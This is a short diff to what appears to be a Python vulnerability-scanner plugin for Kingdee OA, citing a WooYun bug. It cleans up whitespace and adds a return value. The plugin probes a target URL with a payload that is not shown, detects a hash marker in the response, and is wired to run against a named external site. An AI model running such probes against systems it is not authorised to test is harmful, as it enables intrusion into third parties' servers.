@@ -1,5 +1,5 @@
-#!/usr/bin/evn  python 
-#-*-:coding:utf-8:-*-  
+#!/usr/bin/evn  python
+#-*-:coding:utf-8:-*-
 #refer:#http://www.wooyun.org/bugs/wooyun-2015-0136918
 import re,urlparse
 
@@ -21,8 +21,9 @@ def audit(arg):
         url=arg+payload
         code ,head,res,body,_ = curl.curl(url)
         if code == 200 and '81dc9bdb52d04dc20036dbd8313ed055' in res:
-            security_hole(url)      
+            security_hole(url)
+            return arg
 
-if  __name__ == '__main__': 
+if  __name__ == '__main__':
     from dummy import *
     audit(assign('kingdee_oa','http://oa.roen.cn/')[1])
